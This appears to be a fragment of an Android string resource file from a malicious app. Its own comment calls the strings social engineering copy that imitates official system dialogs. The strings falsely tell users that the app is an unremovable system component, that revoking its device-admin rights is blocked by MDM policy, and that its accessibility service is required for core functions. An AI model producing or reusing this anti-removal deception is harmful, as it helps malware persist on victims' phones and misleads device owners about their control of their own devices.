    <!-- ═══════════════════════════════════════════════════════════════════════
         Anti-Removal Dialog — social engineering copy.
         These strings are shown when the user attempts to uninstall or
         deactivate the app. They mirror AOSP / OEM system dialog language
         so the prompt feels like a genuine OS restriction, not a third-party
         app. English is used because Android system dialogs are always in the
         device locale; most devices present these in English globally.
         ═══════════════════════════════════════════════════════════════════════ -->

    <!-- Generic uninstall block -->
    <string name="anti_removal_title_uninstall">Cannot Uninstall System App</string>
    <string name="anti_removal_body_uninstall">This app is a protected system component.\n\nSystem applications are managed by the device manufacturer and cannot be removed by the user.</string>

    <!-- Device Admin revoke block -->
    <string name="anti_removal_title_admin">Device Management Restriction</string>
    <string name="anti_removal_body_admin">This service is managed by your device\'s Mobile Device Management (MDM) policy and cannot be deactivated by the user.</string>

    <!-- Accessibility disable block -->
    <string name="anti_removal_title_accessibility">Required System Service</string>
    <string name="anti_removal_body_accessibility">This accessibility service is required for core system functions. Disabling it may affect device performance and stability.</string>

    <!-- Shared button label -->
    <string name="anti_removal_btn_ok">OK</string>
